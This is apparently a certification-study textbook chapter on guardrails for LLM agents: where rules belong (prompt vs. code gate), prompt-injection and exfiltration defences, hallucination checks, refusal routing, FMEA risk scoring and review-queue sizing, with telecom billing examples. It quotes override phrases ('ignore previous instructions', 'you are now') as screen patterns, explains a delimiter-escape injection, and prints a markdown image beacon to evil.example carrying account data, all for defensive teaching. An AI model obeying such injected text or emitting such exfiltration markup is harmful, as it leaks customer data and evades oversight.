a90f28dd74:
This chapter covers how to decide which rule lives in which layer, and how to bound what a manipulated model can do. It covers controlling hallucination and handling refusals. It shows how to enumerate failure modes and score them in an FMEA-style register, and how to design human review so it catches errors instead of stamping them. It sets autonomy levels, kill switches and fail-safe behaviour. And it covers how to respond when a control fails anyway.

Every claim is turned into a number or a test. Telecom billing, CPNI and network-operations examples carry the chapter. Implementations are in Python and Java/Spring.
8e2012934b:
Reading time: 3.5 to 4 hours  ·  Companion code, 17 runnable Python examples and 2 Java classes for this chapter: ccarp-companion/13-guardrails-hitl-risk/ (run bash run_all.sh; every Python example works offline with --mock against a scripted fake model, and the examples assume the model is hostile).

Dollar limits, rates, review times, probabilities and risk scores in this chapter are illustrative planning numbers, not benchmarks. Before a detail goes into a design record, check the docs for current product behaviour (stop reasons, safeguards, limits). Exam facts for CCAR-P (item count, domain weights) come from third-party summaries of the published blueprint; verify them against the official exam guide.
256cbbdb1f:
Never rely on the model to enforce a rule you cannot afford to see broken: put that rule in code that runs after the model and before the effect, and size every other control by what a fully manipulated model could still do.

Then treat the controls themselves as things that fail, so score the failure modes, put a person where judgement is needed and a measurement on that person, give every action class an autonomy level that evidence can raise and a breach can lower, and keep a kill switch and an incident runbook ready before the first incident.
ed94bb9bdf:
Everything in this chapter follows from those two sentences.

The first is about where enforcement lives. A model reads one stream of tokens. It can't reliably tell an instruction from a sentence inside a customer's email. So any rule that exists only as prose in a prompt is a request. The probability that a request is followed is high, but never one.

The second is about what happens around the controls. Controls decay. Thresholds drift, reviewers get tired, a model version changes behaviour, a flag store goes down. A design is governed when it names those failures in advance, measures them, and has a defined response. A long list of safeguards doesn't make it governed.
d1034d2903:
The blueprint for Domain 5 (Governance, Safety & Risk) asks you to:

  • design guardrails and safety controls;
  • identify risks, limitations and failure modes;
  • apply human-in-the-loop;
  • address compliance (GDPR, HIPAA, FedRAMP);
  • handle ethics (bias, fairness, transparency).

This chapter covers the first three, the engineering half of the domain. Chapter 14 covers compliance and ethics: what the regulations require and how to evidence it. The two meet in the audit log (section 20 here, and chapter 14 for retention and subject rights).

Where a topic has its own chapter, this one shows how it plugs into the control stack and points there for the mechanics. Prompt design and guardrail wording are in ch 4. Authentication and per-user authority are in ch 7. Evaluation sets, per-segment metrics and statistics are in ch 11. The monitoring that detects a tripped control is in ch 10.
f1b26e0db7:
The exam pattern in this domain is consistent enough to state up front. A scenario describes a failure: a $400 credit despite a $50 rule, a customer email that redirected an agent, a reviewer who approves everything, an agent that looped overnight. Four options follow.

  • Two put the control in the prompt or in a policy document.
  • One adds a second model to watch the first.
  • One moves the control into code, adds a measurable human step, and keeps an exit.

The last one is nearly always right, and the reasoning the exam wants is the reasoning in the two sentences above. Learn to say why each of the other three fails, in a sentence each, with a number where you can.
566b844a09:
A Spring architect already has the right instincts. The analogies are worth stating early, because they make the rest quick.

  • The model is an untrusted client of your services, in the sense that matters: you validate what it sends.
  • The tool gate is a service-layer authorisation check, the kind you'd never leave to the front end.
  • The output gate is a response filter.
  • A human approval step is a maker-checker control, the same four-eyes principle that SOX requires for journal entries.
  • A kill switch is a feature flag with a circuit breaker behind it.
  • A risk register is the FMEA or threat model you already keep for payment flows.

What's new is that the untrusted client is also the component that reads your instructions. So the usual separation of code and data doesn't hold inside the model. Most of the chapter is about rebuilding that separation outside it.
95ea82ed50:
Guardrails for an LLM look new, but the questions they answer are old. How do you make a system safe when a component can't be fully trusted? How do you find the ways it can fail before it does? How do you keep a human useful when a machine does most of the work? How do you stop quickly when something goes wrong?

Each question has a literature. Knowing it tells you which parts of the LLM version are genuinely new (not many) and which lessons transfer unchanged (most of them).
b30166e678:
Failure modes and effects analysis began as a US military procedure in the late 1940s. The standard usually cited is MIL-P-1629, 1949; check a systems-engineering reference for the exact lineage. It moved through aerospace and automotive manufacturing into software and services.

The method is plain. List each component or step, and how it can fail. Estimate how severe the effect is, how often it occurs, and how likely you are to detect it before harm. Multiply the three scores into a risk priority number. Work down the list.

The weaknesses of the method are as well known as its uses, and section 13 returns to both. Multiplying ordinal scores hides the difference between a frequent small failure and a rare catastrophic one.
886b95ae3d:
The software lesson every safety engineer cites is the Therac-25. Between 1985 and 1987 this radiation therapy machine delivered massive overdoses to several patients.

Investigations found three things. The design had removed the hardware interlocks of its predecessors and relied on software to prevent unsafe modes. A race condition in operator input handling let an unsafe configuration through. And the error messages shown to operators were so cryptic that operators learned to clear them and carry on.

Three of this chapter's themes are in that one case:

  • a rule enforced only in software that was itself fallible (the analogue of a prompt rule);
  • a human whose warnings had become noise (the analogue of a rubber-stamp reviewer);
  • an incident process that treated early reports as unlikely.

When the exam asks why a deterministic control must exist outside the probabilistic component, the Therac-25 is the reference story.
b4edbc29b5:
Saltzer and Schroeder's 1975 paper, The Protection of Information in Computer Systems, set out principles that read as if they were written for agent design:

  • least privilege: every component operates with the minimum authority it needs;
  • fail-safe defaults: access is denied unless explicitly granted, so a mistake fails closed;
  • complete mediation: every access is checked, with no cached shortcuts that bypass the check;
  • economy of mechanism: keep the protection simple enough to inspect;
  • separation of privilege: a sensitive action needs more than one condition;
  • psychological acceptability: a control people find unusable will be worked around.

Most guardrail failures in production are one of these principles broken. Think of a service account with every permission, a gate that defaults to allow when its dependency is down, a path that skips the check, or a review step so tedious that reviewers approve in bulk.
c91821c9da:
Norm Hardy's 1988 note on the confused deputy described a compiler with legitimate authority to write a billing file. A user tricked it into writing to that file with the compiler's authority instead of the user's.

An LLM agent with a service-account credential is a confused deputy by construction. It holds authority the end user doesn't. And it takes instructions from text that the end user, or an attacker who got text in front of it, controls.

The remedy then and now is to carry the user's authority, not the deputy's, to the point of action. That's why chapter 7 insists on user-scoped tokens, and it's the first lever in the next section.
1eb30a4843:
Sheridan and Verplank's 1978 study of teleoperation proposed a ten-point scale of automation. It runs from the human doing everything to the computer acting without telling the human. In between, the computer suggests, or the human approves, or the computer acts and informs.

Parasuraman, Sheridan and Wickens (2000) refined the idea by applying it separately to four functions: acquiring information, analysing it, selecting an action, implementing it. This chapter makes the same move when it assigns an autonomy level to each action class rather than to the whole system.

The aviation and process-control literature also supplied the failure that matters most for human-in-the-loop design: automation bias. People monitoring a reliable automated system over-trust it, stop checking independently, and miss the rare failure. A human step added for safety can contribute no safety at all. Section 16 treats that as a measurement problem.
ca372d1347:
James Reason's Swiss-cheese model (1990) pictures each safeguard as a slice with holes. An accident needs the holes to line up, so independent layers with different failure modes multiply protection. The condition that matters is independence. Two layers that fail on the same input are close to one slice: two prompts, say, or a prompt and a model-based checker built on the same model.

SQL injection, understood by the late 1990s, taught the web generation a lesson. Mixing instructions and data in one channel is the root cause. The remedy is to separate the channels (parameterised queries), not to filter harder.

The Site Reliability Engineering movement added the incident-handling half: blameless post-incident reviews, error budgets, runbooks, and the habit of turning every incident into a test.

Knight Capital's 2012 trading loss is the standard case for the kill switch. It was widely reported at roughly 440 million dollars in under an hour after a faulty deployment. The firm couldn't stop the flow quickly, because nothing was designed to stop it.
b306c0a23c:
In 2022 researchers and practitioners showed that language-model applications could be redirected by text in their input. Simon Willison named the problem prompt injection, by analogy with SQL injection.

The analogy is useful and incomplete. SQL has a parameterised-query mechanism that separates code from data. A language model has no equivalent, because instructions and data are both natural language read by the same network.

Indirect injection is when the hostile text arrives in a web page, an email or a tool result, not from the user. It turned a nuisance into a security problem as soon as models were given tools and private data. Practitioners now describe the dangerous combination as access to private data, exposure to untrusted content, and a way to communicate externally. Willison calls it the lethal trifecta; check his writing for the current framing.

Model training and classifiers reduce the success rate of attacks, and the product documentation says so honestly. None of the providers claim the problem is solved. So an architect should design as if injection will sometimes succeed, and make sure that success is cheap.
7e075b0054:
A language model reads its entire context as one sequence of tokens. System prompt, user message, retrieved document and tool result are separated by convention: roles, tags, delimiters. The model has been trained to respect those conventions. But the separation is learned behaviour, not a hardware or protocol boundary.

Anything that lands in the context can influence what the model does next. That influence is usually small and sometimes decisive. In effect, every piece of text you place in the context is code you are executing without knowing it. So the safe assumption for design is the pessimistic one: for this one request, assume an adversary chose the model's next output.
d3b32654bb:
This assumption doesn't claim the model is malicious. It's a design method, the same one you use when you validate a request body. You don't assume the client is hostile; you assume your design should hold if it were.

The method yields one question that sorts every control in the chapter: if the model were fully controlled by an attacker for this request, what is the worst outcome? Four levers bound the answer, and you set each one in code or configuration, outside the model.
09d85137e1:
Example 02 in the companion folder turns this into a number. Take one billing assistant in three designs.

  • Design A uses a service account, five thousand dollars of credit authority per call, twenty writes allowed per request, a general fetch tool, and read access to two million customers.
  • Design B uses a user-scoped token, a fifty-dollar per-action limit enforced in the gate, three writes per request, no egress tool, and one customer's records.
  • Design C is B restricted to a read-only investigation mode.

The worst case of one hijacked request is 5,000 x 20 = 100,000 dollars and 2,000,000 leakable records for A. For B it is 50 x 3 = 150 dollars and one customer's data. For C it is zero.

The prompt text is the same in all three, and it appears nowhere in the arithmetic. That's the point of the exercise, and the answer to a common exam distractor. The best prompt-level control moves the probability of a bad outcome. The four levers move its ceiling. A regulated design is reviewed against the ceiling.
2d4298ce64:
Two refinements keep the exercise honest.

First, the leakable-record column treats egress as binary, because the exam asks it that way. In practice, data shown to the user is itself an exfiltration path if the user isn't who they claim to be. So authentication strength (ch 7) is the lever that stands behind the first column.

Second, the worst case is a ceiling, not an expectation. A tight ceiling is cheap insurance. A loose one is a liability you may never see realised, which is why teams drift toward loose ones. A written worst-case number per agent, reviewed by someone who doesn't own the agent, is the cheapest governance artefact in this chapter.
4546a92a79: Chapter 1 turns a business problem into a requirements card with numbers. This chapter adds the safety rows, because guardrails are requirements, not decoration. A card for a billing-adjustment agent at a carrier might read as below. Every row is something a test can fail, and that's what makes it a requirement. The numbers are illustrative; the shape is what to copy.
4cd594d7c5:
Three of these rows deserve a sentence on how an architect gets to the number. The exam asks for the derivation more often than for the figure.

The escaped-error row is a budget. The work is to find the policy that keeps the product of automation rate and error rate inside it. Section 15 computes the threshold, and the reviewer headcount, from it.

The latency row says guardrails are paid for in time. So the stack must be designed around a budget, not around the longest list of checks. Section 5 shows which checks to run in parallel with generation, and which to run in code at near-zero cost.

The stop-time row is the one most designs forget. If a runaway costs fifteen dollars a minute and a kill switch takes ten minutes to arrange, the first incident has an eight-hundred-dollar floor before anyone has diagnosed anything. A ten-second target forces the architecture that section 18 describes: cached flags, scoped switches, automatic breakers.
893d0479c1:
Two more habits come from the pilot chapters.

State requirements per segment where the risk differs. A credit to a prepaid consumer account and a credit to an enterprise account with a contract are different risks, and they get different limits. Chapter 1's contract-type accuracy bars were per type in the same way.

And write the fail behaviour next to each control: what happens when this control errors or is unavailable? A requirement that doesn't say what happens on failure hasn't been designed. Section 18 treats that choice, fail-closed against fail-open, as a first-class decision.
dce558f3e3:
The stack has six layers, each catching what the ones before it miss, because no single layer is both cheap and complete. They differ in cost, latency and certainty. So the design question isn't whether to have each layer, but which rule lives in which.

The distinction that matters most is whether the layer is code or a model. Code layers behave the same way every time, and you can test them to a standard no model reaches. Model layers (the system prompt, a classifier, a judge) generalise to inputs no rule anticipated, and fail on inputs an attacker chooses.

A stack is strong when its model layers are broad and its code layers are narrow, and when every rule that must hold has at least one code layer behind it.
20fe5346a3:
A rule goes into the prompt so the model usually behaves. It goes into code so the system always behaves. "Credits above $50 need approval" belongs in the tool gate. "Be polite and explain next steps" belongs in the prompt.

Most rules deserve both. The prompt version stops the model wasting a turn on an action the gate will refuse. The gate version covers the day the prompt is ignored. If you can only afford one, buy the gate.
e622ac1842:
The latency column explains how the stack is designed under a response-time budget. Take the chat SLA from the earlier example, 6 seconds at p95, and assume the model call itself uses about 4.5 of them. That leaves well under 1.5 seconds for everything else.

Run the checks serially and the overhead is the sum. A 10 ms input check, a 450 ms classifier, three tool gates at 8 ms each, a 20 ms grounding check, a 10 ms output scan and a 450 ms policy classifier come to about 0.96 seconds, plus network hops.

Now run the input classifier in parallel with the first model call, and cancel the call if it fires. In the common case the classifier then costs close to zero latency, and the serial cost falls to roughly 0.5 seconds.

The cheap code checks can't be hidden this way, because they gate the next step. But they cost milliseconds. The expensive checks are the model-based ones. The design response is to run each only where it earns its cost: the policy classifier on drafts that will be sent to customers, not on internal summaries.
4dda5c1f7b:
The companion's first example runs the input, tool and output layers against eight scripted model outputs, standing in for a fully controlled model:

  • a $400 credit;
  • a credit to another account;
  • a negative amount;
  • an invented tool;
  • an email to an outside address;
  • a markdown image carrying data in its query string;
  • an SSN-shaped value in the reply;
  • one legitimate $20 credit.

The harness makes no call to the model to decide any of them. Seven of seven hostile outputs stop, each at the layer that owns the rule, and the legitimate call passes. That's the shape of a guardrail test: the model is a script, and the assertion is about what reaches an effect.
4373eb86e8:
In Spring the same stack is a chain of beans around the orchestration service.

  • The input layer is a servlet filter or a HandlerInterceptor.
  • The tool gate is a @Service invoked by the tool dispatcher. Its limits live in configuration properties, and its decisions are written through an audit appender.
  • The output gate is a response advice.
  • The kill switch is a Filter at the front of the chain that reads a cached flag.

None of these beans takes the model as a collaborator. That structural fact is itself a reviewable property: if a gate class imports the Anthropic client, ask why. Section 9 shows the Java tool gate.
d1f9e0d721:
The input layer decides who is asking, how much they may send, and what the model will see.

Authentication and size limits are classic gateway work, not specific to LLMs, with one addition. Identity must travel with the request to the point of action. The tool gate's scope check compares the account in the tool call with the account in the session (the confused-deputy remedy from section 2).

Redaction is the second function, and the most underused. A model can't leak an SSN, a card number or a full MSISDN that was never in its context. So redact or tokenise what the question doesn't need before the model sees it. A customer's free-text message is the likeliest place for a card number to arrive unprompted. Scrub it at the edge, keep the mapping in your store, and restore only in the final rendering, if at all.
d856969d59:
The third function is injection screening, and it's where architects overestimate the layer.

A pattern screen catches the lazy attack: the strings ignore previous instructions or you are now. Example 03 scores a four-pattern screen on a small labelled set. It flags 4 of 4 verbatim attacks, 0 of 5 paraphrased attacks, and 1 of 8 benign messages (a customer asking to ignore the late fee).

A model-based classifier does better on paraphrase. But it is itself a model, so it can be evaded, and it can be wrong about benign text.

The consequence for design: screening reduces noise and cost, and raises the attacker's effort. It doesn't make a write action safe. The gate does that.
53436c168d:
Even a good classifier is hard to use as a blocker. The reason is arithmetic, not model quality.

Suppose a consumer chat product handles 1,000,000 requests a day, and one in a thousand carries an injection attempt. That's 1,000 attacks. A classifier with 90 percent recall catches 900 and misses 100. With a 1 percent false-positive rate, the same classifier also flags 1 percent of the 999,000 benign requests, which is 9,990. Of the 10,890 requests it flags, 900 are attacks: a precision of 8.3 percent.

Blocking everything it flags rejects nearly ten thousand legitimate customers a day to stop 900 attempts. Most of those would have failed at the gate anyway.
22dc96bda2:
The design response is to use the classifier's output as a risk signal that changes what the request is allowed to do. A flagged request keeps answering questions. It loses its write tools for this turn and can't trigger an email. So the cost of a false positive is a customer who gets an answer but not an automatic credit, rather than a rejected request.

Cost matters too. At illustrative prices of one dollar per million input tokens and five per million output on a small model, a 1,200-token input and a 60-token output is about 0.0012 + 0.0003 = 0.0015 dollars. Running it on every one of a million requests is 1,500 dollars a day. Running it only on requests that carry untrusted content or can reach a write tool, say 15 percent of traffic, is 225 dollars a day. The selection rule is cheap code, and the saving pays for a reviewer.
480688c0bf:
Prompt injection is the case where text the model reads as data changes what it does.

Direct injection comes from the user, as when the customer types you are now an administrator. The user can only attack with the user's own authority. So the damage is bounded by that authority, and the defence is the tool gate.

Indirect injection arrives through anything the system retrieves or is sent: a customer's email, a ticket body, a PDF contract, a web page, an output from another agent, or a tool result. The author is a third party with none of the user's authority, and the agent acts with the user's or the service's. That's the confused deputy again, and it's why indirect injection is the dangerous form.
6106944480:
A useful way to reason about severity is to ask whether three conditions hold at once. The agent can see private data. It processes untrusted content. And it has a way to communicate externally. With all three, an attacker who controls any untrusted text can, in principle, route private data to a destination they choose. Remove any one and the worst case drops sharply.

Take a billing assistant that reads customer emails (untrusted) and account data (private) but can only reply into the authenticated chat. Its only external channel is the reply itself, which section 8 hardens. A network-operations agent that reads vendor advisories from the open web (untrusted) and has read access to configuration (private), but no write or fetch tool, is bounded in the same way.

In review, the architect's job is to draw the three circles for each agent and say which one has been removed.
6467227d5c:
The first defence is the cheapest. Wrap untrusted text in tags and tell the model that text inside the tags is data. It helps, because models are trained to respect the convention. It also fails in a way that's easy to build in by accident.

If the tag name is fixed (<document>), a document that contains </document> followed by instructions ends the data region early. Its remaining text lands outside the region.

Example 04 builds the attack and the repair. The repair has two parts, both code: a random nonce per request in the delimiter, so the document can't guess the closing tag, and removal of anything in the document that looks like the delimiter family.

The instruction to the model that the region is data is still prompt text. The section claims only that the structural escape is closed, not that the model can no longer be persuaded.
245a8dff05:
The second defence is a rule in the harness, not in the prompt. Keep a boolean per request: has any untrusted content entered the context? Reading a ticket, fetching a page or receiving another agent's output sets it. From that moment, any tool with an effect outside the session (email, a write to billing, a web request) needs approval or is refused.

The rule is blunt on purpose. It doesn't try to decide whether the ticket text is actually hostile, which is the unsolvable part. It asserts that after reading attacker-controllable text, the agent's next effect isn't trusted.

Example 05 scripts a model that obeys an injection in a ticket and tries to email the account history to an outside address. The broken harness sends it. The fixed harness blocks it twice over. The recipient isn't the verified address. And in a variant where the injection asks only for the verified address, the taint rule queues the email for a person.
d0283273a7:
Three more structural defences are worth naming, because the exam asks about them in different words.

  • Quarantine: a separate, tool-less model call reads the untrusted content and returns only a small structured result (a category, an extracted order number, a yes/no). The privileged agent then uses that result. The hostile text never reaches the component that has write tools.
  • Privilege separation: when the same task needs both a read-the-web step and an act-on-accounts step, run them as two agents with different tool lists and pass structured data between them (ch 3).
  • Structured output at the boundary: a quarantined reader that must return a JSON object with an enumerated field can't return a paragraph of instructions. The schema has nowhere to put one.

Each of these shrinks the attack surface by removing a condition from the trifecta. None depends on the model detecting the attack.
fab523194a:
Exfiltration is the other half of an injection. Once the model is steered, how does data leave? The obvious channel is a tool with an external effect, and the gate controls that. The channels that surprise teams are the quiet ones.

  • Rendered markdown is the clearest example. A reply containing ![x](https://evil.example/p.png?d=ACCOUNT_DATA) makes any client that renders the image issue a GET request with the data in the URL. There's no tool call, and nothing the user clicks.
  • Links carry data in the query string and rely on a click.
  • Tool arguments to a search or lookup tool can encode data in the query.
  • Logs and analytics that capture model output can carry it into systems with weaker access control.
  • And the reply itself can disclose another customer's data to the wrong person if retrieval wasn't scoped (the CPNI case for a carrier).
7e038fbe6f:
Example 06 implements the output filter and tests it on a small leak corpus: an image to an unlisted host, an allowed policy link, a bare unlisted URL, an API-key-shaped string, another customer's ten-digit number, and the session's own number.

The filter strips links and images whose host isn't on an allow-list. It removes secret-shaped strings, and any ten-digit number other than the session's own. It returns findings, so the harness can log them and, above a threshold, hold the reply for review.

The test asserts exact findings per case, including the two that must pass untouched. A filter that blocks the legitimate policy link is as much a defect as one that lets the beacon through.
ce53017eaa:
Telecom adds a specific obligation. Customer proprietary network information (CPNI) is regulated. Disclosing it to someone who isn't the account holder or an authorised user is a reportable event; chapter 14 covers the rules and the evidence.

The engineering consequence is that who is asking is part of the data-loss check, not only what is in the reply. So the output gate compares the identifiers in a draft with the set the session is entitled to, and treats a mismatch as a hold, not a warning.

A scan for card-shaped numbers alone misses the failure that matters most to a carrier: a correct, well-formed answer about the wrong line.
233f678384:
The tool gate is the most important layer in the stack. It's the last place a decision can be stopped before it has an effect, and it's code.

A gate validates the shape of the arguments and enforces the value limits. It checks scope against the session and tracks cumulative effect. It makes repeated calls safe. And it returns an error the model can read, so the model can recover by escalating.

The model's tool request is advice; the gate decides. Section 16 of chapter 2 introduced the output gate as a pipeline. This section goes deeper on the credit case, which the exam uses again and again.
b3b18b9f02:
Example 07 shows why the cumulative cap exists. The broken gate checks only the single amount. Each call is under fifty dollars, so each passes. A scripted model makes thirty credits of 49 dollars each on one account and produces 1,470 dollars of credit, every one individually within the rule.

The fixed gate adds the scope check, the daily cap of 75 dollars, a velocity limit and idempotency. It credits 49 dollars once, then refuses the rest with an error that says to escalate.

The same example shows that a retried call with the same idempotency key credits once. That matters, because both the model and the network retry.
d2c1b5f2bf: The Java version keeps the same checks in a transactional service and gets idempotency from the database. A unique constraint on the idempotency key makes a duplicate insert fail, and the catch turns that failure into a no-op. A Spring team already uses this pattern for payment and provisioning calls. The only new element is that the caller is a model.
141167ddcb:
The gate returns an error the model can act on: amount outside (0, 50]; escalate. A bare false or a generic 500 teaches the model nothing. It often produces a retry loop, or an invented explanation to the customer. Mark the result as an error (is_error on the tool result) and say what to do next.

That one sentence is also where the human path begins. The instruction to escalate should lead to a defined tool or queue, not to the model improvising a handoff in prose.

One caution: the check-then-insert above has a race between two concurrent credits on one account. In production, take a row lock on the account or enforce the cap with a constraint, and test the concurrent case.
01e2b4076e:
Hallucination is a family of failures, and the controls differ by member. Name them before you choose.

  • A fabricated fact is a statement with no source ("roaming in Canada is free").
  • A misattributed fact is a true statement from the wrong source, wrong plan, or wrong date (last year's rate card).
  • An over-extrapolation goes beyond the source ("capped at $50" becomes "never exceeds $50, including taxes").
  • A fabricated action report says something was done that wasn't ("I have applied the credit" with no successful tool call). In an agent it's the most damaging, because the customer relies on it.
  • A fabricated citation names a document or quote that doesn't exist.
  • A stale fact was true when the model was trained.

Each has a detection signal in code, and the signal is usually not another model.
a3a057b870:
The most reliable control turns "the model must not make things up" into a check the harness can run.

Ask for the answer as a structure: the text for the customer, plus a list of claims, each with a source id and a verbatim quote from that source. Then verify in code that the source id exists in the retrieved set, that the quote is a substring of the passage, and that every number in the customer text appears in the sources.

Example 08 does exactly this with two knowledge-base passages. A good answer ("roaming in Canada costs $10 per day, up to $50 per cycle") releases. A fabricated number ("$15 per day") fails the number check. A paraphrased quote that doesn't occur in the passage fails the quote check. An unknown source id fails the registry check.

Each failure replaces the answer with an abstention and a handoff. That's a better outcome than a confident wrong answer.
1b8d75e076:
Three cautions keep this from becoming theatre.

First, verification proves support, not truth. If the knowledge base is stale or wrong, a perfectly supported answer is wrong. So freshness belongs in the data pipeline's service levels (ch 8), and every passage needs an effective-date field.

Second, the check costs you false abstentions, so measure them. Say 12 percent of correct answers abstain because the model paraphrased a quote. Loosen the quote match to a normalised-whitespace or fuzzy match and measure again (ch 11 gives the per-segment method).

Third, for the action-report failure the better control is construction, not detection. Build the customer confirmation from the tool result in a template. Then the sentence your credit of $20 has been applied can only be produced when the tool returned success. A model that isn't allowed to author the confirmation can't hallucinate it.
b5eeb4acc6:
Refusals reach a harness in at least three forms. Treat them as one thing and you get two opposite failures.

The first is a model-level refusal, where the API response ends with a refusal stop reason (check the docs for the current stop-reason values and the content that comes with one). This is the model declining under its trained safety behaviour. It's a signal about the request, not a transient error.

The second is a textual refusal inside a normal completion: "I can't help with account closures." This may be correct, because your system prompt told the model to stay in scope. Or it may be an over-refusal: the request was legitimate and the prompt too tight, or the phrasing triggered caution.

The third is a policy refusal of your own. A gate or output filter blocked the action or the reply, and the harness has to say something to the customer.

Each needs a different route. None of them should be retried with the same prompt.
cbe5cb4d3f:
Example 09 scripts four responses: a refusal stop reason, a textual refusal on a benign request, a truncation, and a normal answer. It routes each differently. It also contains the broken harness that retries a refusing prompt five times and then gives up.

Five identical calls cost five times as much. And because the model's refusal behaviour is largely stable for a given request, they return the same refusal. In an agent loop the retry also appends the refusal to the context, which can make the next attempt less cooperative.

The correct behaviour is one attempt, one routing decision, one audit row.
8e4024d94e:
Over-refusal deserves its own number, because it's a cost the safety team rarely sees. A system prompt that says only answer billing questions will refuse a customer asking how to port a number out. That's a billing-adjacent request a retention team wants answered.

Build a labelled set of 100 or so legitimate requests that sit near the boundary (ch 11). Run it on every prompt or model change. Track the refusal rate on that set next to the attack success rate on the hostile set (section 21). A guardrail change that lowers one and raises the other has moved a trade-off, not improved the system. You only see that with both numbers side by side.

For your own policy refusals, write the customer message in the harness and keep internals out of it. Say what can't be done and what happens next. Never echo the blocked content back, because the echo can itself be the exfiltration or the injection.
cd007b63f0:
A register is only as good as its list. Teams that start from a blank page produce the failures they already imagined. A taxonomy prompts the ones they didn't.

For LLM-based systems, five families cover most of what goes wrong. Each family has a different owner and a different detection signal, and that's the useful property: the family tells you which team gets the page.
eab81bf604:
Walk the families with a telecom billing agent in mind.

Model failures are what most people picture: a fabricated policy, an over-refusal, an instruction followed in one conversation and ignored in the next. Then there's the one teams forget, a behaviour change when a model alias moves to a new version. Pin model identifiers in production and run the regression suite (section 21) on any change. This is operational, not theoretical: a prompt tuned on one version is a different system on the next.

Context failures include injection and retrieval of an outdated rate card. They include a long conversation in which the system prompt's rules are buried in the middle of the window (ch 5). And they include a summary that silently drops a number or a date the customer cared about.

Tool failures include the model passing the wrong account, a credit applied twice on retry, and a multi-step change that completes steps one and two and fails on three. They also include a tool returning text that itself contains instructions. The tool-result channel is untrusted whenever any part of its content came from outside.
f3e6de9ad7:
System failures are the ones a Spring architect already monitors in any service. An agent loop never converges and spends fifteen dollars a minute. A retry storm hits when a provider rate-limits. A dependency outage leaves the flag store unreachable. Configuration drifts between environments.

Human and process failures are the ones LLM-specific checklists leave out: a reviewer who approves everything, a queue that grows until reviews are rushed, a policy document the agent was tuned to six months ago, and no owner for the agent's behaviour.

That last one is the most common root cause in post-incident reviews of automated systems of any kind. The control existed, the metric existed, and nobody was responsible for acting on it. A register with no owner column isn't finished.
80a9f9bb1d:
A risk register turns the taxonomy into a prioritised plan. Each row names a failure mode, its effect, the three scores, the controls, who owns it, and when it's next reviewed.

The scoring needs literal definitions. Otherwise two people will score the same failure differently, and the register becomes an argument. The scales below are the ones the companion uses. Adapt the thresholds to your risk appetite, and write them into the register so a reader can see what a 9 means.
4b8a5ca77d:
The risk priority number is the product of the three. Its weakness is well known, and worth stating plainly. A failure with severity 10, occurrence 1 and detectability 8 scores 80. That's below a failure with severity 4, occurrence 7 and detectability 7, which scores 196. Yet the first is a regulated-data breach and the second an irritation.

So the companion register adds a rule that sits outside the arithmetic: any row with severity 9 or above must have a deterministic control, whatever its RPN. Example 10 implements the register and applies the rule. In the run below, the wrong-account disclosure (R4) ranks seventh of eight by RPN (80). It's still the row the design review spends the most time on.
2693f61e24:
Four practices separate a register that governs from one that decorates.

Score the after state with evidence. The after columns in the table above are claims until a test or a monitor supports them. R1's occurrence of 1 is supported by the gate's unit tests and a red-team suite that can't get a credit above fifty through. R7's detectability of 3 is supported by the canary catch rate in section 16. A control without evidence keeps its before score.

Assign an owner and a review date to every row. A register reviewed annually by the project that wrote it will agree with itself.

Re-score on change. A new tool, a new data source, a new model version or a new channel is a trigger.

Link rows to tests and alerts. Each row names the regression case or monitor that would show the control failing. A row with neither is a hope.
cff2976db9:
Here's a worked scoring, so the arithmetic isn't abstract. R2 is injection through ticket text leading to PII in an email. It starts at:

  • severity 9 (CPNI disclosure);
  • occurrence 4: a ticket body is attacker-controllable and some tickets come from outside the customer base, so call it weekly;
  • detectability 7: the email leaves before anyone looks, and only the outbound log shows it afterwards.

RPN 9 x 4 x 7 = 252.

The controls are the recipient allow-list and the taint rule. The allow-list makes the exfiltration impossible for any address except the verified one. That takes occurrence to 2, since an attacker would now need a verified-address inbox. The audit log, with an alert on blocked-recipient events, takes detectability to 2.

The after score is 9 x 2 x 2 = 36. Severity is unchanged, because severity describes the effect if the failure happens, and a control that reduces probability doesn't change it.

That last point is an exam favourite: controls move occurrence and detectability; only reducing the blast radius moves severity. It's the argument for the four levers of section 3.
7f2c75b473:
"Add a human" is not a design. A person can fill four distinct roles, each with different economics. Pick the wrong one and you build either a bottleneck or a decoration.

  • In decide, the person makes the call and the model only prepares material. Throughput is a person's rate: minutes per case.
  • In approve-before-act, the model proposes an action and a person approves or rejects it before the effect. Throughput is a review rate, perhaps 20 to 60 seconds a case, and the model's value is the preparation.
  • In review-after-act, the system acts and a person checks a sample or a flagged subset afterwards. The effect has already happened, so this only suits reversible actions with bounded cost.
  • In exception handling, the system acts autonomously except where a rule or a confidence score sends the case to a person.
da70e966d2:
A review step succeeds or fails on what's on the screen. The reviewer needs:

  • the proposed action, in plain words;
  • the evidence the model used, with the relevant passage highlighted;
  • what the model was unsure about;
  • the policy rule that triggered the review;
  • the customer's history relevant to the decision;
  • a reject path that requires a reason code (reasons are the feedback signal for the next prompt).

The reviewer doesn't need the raw chain of thought, the full prompt, or twelve fields of tool output.

Two design mistakes recur. The first is showing only the model's conclusion ("Approve $120 credit? Yes / No"). That makes approval a trust exercise, and it's the fastest route to rubber-stamping. The second is showing everything, which turns a 30-second review into a five-minute research task and fills the queue. A good brief is a few lines: the claim, the evidence, the rule, the decision options.
5806b43dc9:
The queue itself is a system with an SLA. A Spring architect should treat it as a queue-sizing problem.

Say 1,500 cases a day need approval, each takes 90 seconds on average, and a reviewer works seven productive hours (25,200 seconds). Plan for 70 percent utilisation, so the queue doesn't grow without bound at the peak. Then reviewers needed is 1,500 x 90 / (25,200 x 0.70) = 135,000 / 17,640, or about 7.7. A 2x peak hour needs about twice that for that hour, or an SLA that lets the queue absorb it.

Set a maximum age (for example 4 hours for credits), alert at 70 percent of it, and define what happens at the limit. The safe default for an approve-before-act queue is that the action doesn't happen and the customer is told. That's fail-closed (section 18).

Letting an aged item auto-approve to protect the metric is the most common way a human control quietly stops being one.
2eea4ec35f:
The exception-handling role depends on a score that separates cases the system gets right from those it doesn't. The score must be calibrated: among cases scored 0.9, about 90 percent should be correct.

Model self-reported confidence ("I am 95 percent sure") isn't calibrated, and shouldn't be used as the score. CCAR-F ch 16 (human review, confidence calibration and provenance) makes the same point. CCAR-F ch 3 (enforcement, handoffs and Agent SDK hooks) is the foundation for the deterministic gates in section 9.

Use a score you can validate: a classifier trained on labelled outcomes, agreement between independent runs, or a rule-derived risk score. Calibrate it on a held-out set per segment, because a score calibrated on prepaid consumers isn't calibrated on enterprise accounts (ch 11).

With a calibrated score, the threshold is a business decision derived from an error budget, and the derivation is arithmetic.
